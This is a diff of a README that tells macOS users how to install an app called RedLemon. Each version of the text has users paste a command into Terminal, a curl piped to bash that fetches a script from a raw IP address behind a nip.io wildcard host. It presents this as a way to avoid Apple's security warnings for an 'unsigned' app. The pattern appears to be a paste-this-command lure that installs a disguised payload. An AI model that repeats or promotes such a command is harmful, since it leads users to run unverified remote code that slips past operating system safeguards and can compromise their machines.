@@ -1,17 +1,22 @@
-# 🍋 Install RedLemon
+# 🍋 How to Install RedLemon
 
-To install RedLemon without Apple's security warnings, follow these 3 simple steps.
+RedLemon is an "unsigned" app. To install it seamlessly without security errors, follow these 3 easy steps.
 
-### Step 1: Copy this command
+### 1. Copy the Code
+Highlight the command below and copy it (**Cmd + C**):
+
 ```bash
 curl -sL https://151.243.109.243.nip.io/updates/install | bash
 ```
 
-### Step 2: Open Terminal
-Press `Command (⌘)` + `Space` on your keyboard, type **Terminal**, and hit Enter.
+### 2. Open Terminal
+Press **Command (⌘) + Space** on your keyboard to open Spotlight.
+Type **Terminal** and press **Enter**.
 
-### Step 3: Paste and Enter
-Paste the command into the window and press **Enter**.
+### 3. Paste & Run
+In the window that opens, press **Command (⌘) + V** to paste the code.
+Press **Enter** to run it.
 
 ---
-*The app will download, install to your Applications folder, and open automatically.*
+
+**That's it!** RedLemon will download, install to your Applications, and open automatically.
